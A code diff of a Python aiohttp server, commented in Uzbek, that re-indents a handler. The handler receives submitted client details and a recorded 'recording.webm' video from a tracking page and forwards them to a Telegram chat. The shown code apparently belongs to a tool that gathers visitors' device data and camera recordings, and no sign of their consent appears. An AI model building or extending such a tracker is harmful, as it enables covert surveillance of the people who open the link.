@@ -202,6 +202,7 @@ async def track_page(request: web.Request):
     return web.Response(text=html, content_type="text/html")
 
 # === Ma'lumot yoki video qabul qilish ===
+# === Ma'lumot yoki video qabul qilish ===
 async def submit_data(request: web.Request):
     try:
         reader = await request.multipart()
@@ -234,27 +235,27 @@ async def submit_data(request: web.Request):
             f"🗣 Tillar: {client_data.get('languages')}"
         )
 
-if video_data:
-    try:
-        video_file = BytesIO(video_data)
-        video_file.name = "recording.webm"
-        await request.app["bot"].send_video(
-            chat_id=user_id,
-            video=InputFile(video_file),
-            caption=message,
-            supports_streaming=True
-        )
-    except Exception as e:
-        logger.exception("Videoni yuborishda xato")
-        await request.app["bot"].send_message(
-            chat_id=user_id,
-            text=f"⚠️ Video yuborishda xato: {str(e)[:100]}"
-        )
-else:
-    await request.app["bot"].send_message(chat_id=user_id, text=message)
-
+        if video_data:
+            try:
+                video_file = BytesIO(video_data)
+                video_file.name = "recording.webm"
+                await request.app["bot"].send_video(
+                    chat_id=user_id,
+                    video=InputFile(video_file),
+                    caption=message,
+                    supports_streaming=True
+                )
+            except Exception as e:
+                logger.exception("Videoni yuborishda xato")
+                await request.app["bot"].send_message(
+                    chat_id=user_id,
+                    text=f"⚠️ Video yuborishda xato: {str(e)[:100]}"
+                )
+        else:
+            await request.app["bot"].send_message(chat_id=user_id, text=message)
 
         return web.Response(text="ok")
+
     except Exception as e:
         logger.exception("submit_data xato")
         return web.Response(status=500)
